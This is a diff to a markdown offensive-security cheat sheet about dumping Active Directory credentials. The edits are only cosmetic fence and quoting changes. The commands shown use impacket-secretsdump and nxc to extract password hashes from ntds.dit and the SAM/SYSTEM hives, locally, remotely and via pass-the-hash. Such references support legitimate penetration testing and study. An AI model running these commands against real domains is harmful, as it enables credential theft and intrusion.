@@ -4,12 +4,11 @@ date: 2024-7-2
 tags: ["secretsdump", "impacket", "active directory", "ad", "domain controller", "Windows", "ntds.dit", "hive", "hashes", "nxc", "dcsync"]
 ---
 
----
 ### Convert ntds.dit to .sqlite
 
 <div>
 
-```bash
+```console
 ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
 ```
 
@@ -24,7 +23,7 @@ ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
 
 <div>
 
-```bash
+```console
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
 ```
 
@@ -39,7 +38,7 @@ impacket-secretsdump -ntds ntds.dit -system system LOCAL
 
 <div>
 
-```bash
+```console
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
@@ -55,8 +54,8 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 
 <div>
 
-```bash
-impacket-secretsdump <USER>:<PASSWORD>@<TARGET>
+```console
+impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
 ```
 
 </div>
@@ -66,7 +65,7 @@ impacket-secretsdump <USER>:<PASSWORD>@<TARGET>
 
 <div>
 
-```bash
+```console
 nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds
 ```
 
